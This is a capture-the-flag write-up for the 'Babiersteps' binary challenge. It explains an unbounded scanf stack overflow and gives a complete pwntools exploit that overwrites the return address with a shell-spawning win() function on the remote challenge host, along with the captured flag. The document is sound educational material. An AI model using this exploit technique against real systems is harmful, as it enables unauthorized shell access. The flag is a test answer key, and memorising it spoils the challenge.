# Babiersteps

## Challenge

We are given a simple binary that prints a message, then reads from stdin using `scanf()`.

```asm
┌ 55: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_70h @ rbp-0x70
│           0x004011ea      f30f1efa       endbr64
│           0x004011ee      55             push rbp
│           0x004011ef      4889e5         mov rbp, rsp
│           0x004011f2      4883ec70       sub rsp, 0x70
│           0x004011f6      488d3d130e00.  lea rdi, str.Everyone_has_heard_of_gets__but_have_you_heard_of_scanf_ ; 0x402010 ; "Everyone has heard of gets, but have you heard of scanf?" ; const char *s
│           0x004011fd      e86efeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401202      488d4590       lea rax, [var_70h]
│           0x00401206      4889c6         mov rsi, rax
│           0x00401209      488d3d390e00.  lea rdi, [0x00402049]       ; "%s" ; const char *format
│           0x00401210      b800000000     mov eax, 0
│           0x00401215      e886feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x0040121a      b800000000     mov eax, 0
│           0x0040121f      c9             leave
└           0x00401220      c3             ret
```

The binary also contains a `win()` function which will spawn a shell.

```c
void sym.win(void)

{
    sym.imp.execve("/bin/sh", 0, 0);
    return;
}
```

## Solution

The program uses `scanf()` to read a string without checking for the length of the string.

There is no canary or PIE, so we can easily overflow the stack buffer and overwrite the return address.
If we change the return address to the address of the `win()` function, it will spawn a shell and we can read the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 31951 babiersteps
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('babiersteps')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 31951)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.sendlineafter(b"Everyone has heard of gets, but have you heard of scanf?\n", flat({ 0x70+8: exe.sym['win']}))

io.interactive()
```

## Flag

```
flag{4dc0a785da36bfcf0e597917b9144fd6}
```
